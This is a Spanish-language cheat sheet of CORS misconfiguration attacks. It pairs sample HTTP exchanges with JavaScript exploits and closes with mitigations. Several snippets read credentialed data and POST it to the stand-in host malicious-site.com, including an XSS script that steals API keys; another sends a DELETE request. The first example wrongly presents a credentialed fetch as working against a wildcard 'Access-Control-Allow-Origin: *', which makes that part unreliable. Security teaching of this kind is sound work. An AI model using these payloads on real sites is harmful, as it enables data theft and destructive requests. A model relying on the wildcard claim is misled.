# 🌎 Real World Payloads

## CORS (Cross-Origin Resource Sharing)

### Configuración Incorrecta de CORS

#### Vulnerabilidad: `Access-Control-Allow-Origin: *`

**Ejemplo de Solicitud**

```http
GET /sensitive-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-site.com
```

**Respuesta esperada**

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json

{
  "user": "admin",
  "email": "admin@vulnerable.com",
  "token": "abc123"
}
```

**Explotación**

Un atacante puede crear un script para exfiltrar datos sensibles:

```javascript
fetch('https://vulnerable-website.com/sensitive-data', {
  method: 'GET',
  credentials: 'include'
})
  .then(response => response.text())
  .then(data => {
    fetch('https://malicious-site.com/log', {
      method: 'POST',
      body: data
    });
  });
```

***

#### Vulnerabilidad: Reflejo Dinámico del Encabezado `Origin`

**Ejemplo de Solicitud**

```http
GET /api/private-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-site.com
```

**Respuesta esperada**

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-site.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{
  "data": "Sensitive information"
}
```

**Explotación**

```javascript
fetch('https://vulnerable-website.com/api/private-data', {
  method: 'GET',
  credentials: 'include'
})
  .then(response => response.json())
  .then(data => {
    console.log(data);
  });
```

***

### Uso del Valor `null` en `Origin`

**Ejemplo de Solicitud**

```http
GET /internal-data HTTP/1.1
Host: vulnerable-website.com
Origin: null
```

**Respuesta esperada**

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json

{
  "internal": "This should not be accessible."
}
```

**Explotación**

Solicitudes realizadas desde documentos locales pueden aprovechar este comportamiento.

```javascript
fetch('https://vulnerable-website.com/internal-data', {
  method: 'GET',
  credentials: 'include'
})
  .then(response => response.json())
  .then(data => {
    alert(data.internal);
  });
```

***

### Métodos y Encabezados Excesivamente Permisivos

**Ejemplo de Configuración**

```http
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, X-Custom-Header
```

**Explotación**

Un atacante puede realizar solicitudes no intencionadas con métodos como `DELETE`:

```javascript
fetch('https://vulnerable-website.com/resource/123', {
  method: 'DELETE',
  credentials: 'include'
})
  .then(response => {
    if (response.ok) {
      console.log('Resource deleted!');
    }
  });
```

***

### Ataques Basados en Subdominios

**Ejemplo: Subdominio con XSS**

1.  Subdominio vulnerable (`sub.vulnerable-website.com`) tiene una XSS:

    ```javascript
    <script>
    fetch('https://vulnerable-website.com/api/keys', {
      method: 'GET',
      credentials: 'include'
    })
      .then(response => response.json())
      .then(data => {
        fetch('https://malicious-site.com/log', {
          method: 'POST',
          body: JSON.stringify(data)
        });
      });
    </script>
    ```
2.  Subdominio está configurado como origen confiable:

    ```http
    Access-Control-Allow-Origin: https://sub.vulnerable-website.com
    Access-Control-Allow-Credentials: true
    ```

**Resultado**

El atacante exfiltra datos sensibles desde el dominio principal utilizando el subdominio vulnerable.

***

### Mitigaciones

1.  **Configurar Orígenes Específicos:**

    ```http
    Access-Control-Allow-Origin: https://trusted-site.com
    ```
2. **Evitar Reflejar el `Origin`:**
   * Usar listas blancas estrictas de dominios permitidos.
3.  **Restringir Métodos y Encabezados:**

    ```http
    Access-Control-Allow-Methods: GET, POST
    Access-Control-Allow-Headers: Content-Type
    ```
4. **Usar `Access-Control-Allow-Credentials` con Precaución:**
   * Solo habilitarlo si es estrictamente necesario y con una lista específica de orígenes confiables.
5. **Auditorías Periódicas:**
   * Revisar las políticas de CORS en busca de configuraciones inseguras.

***
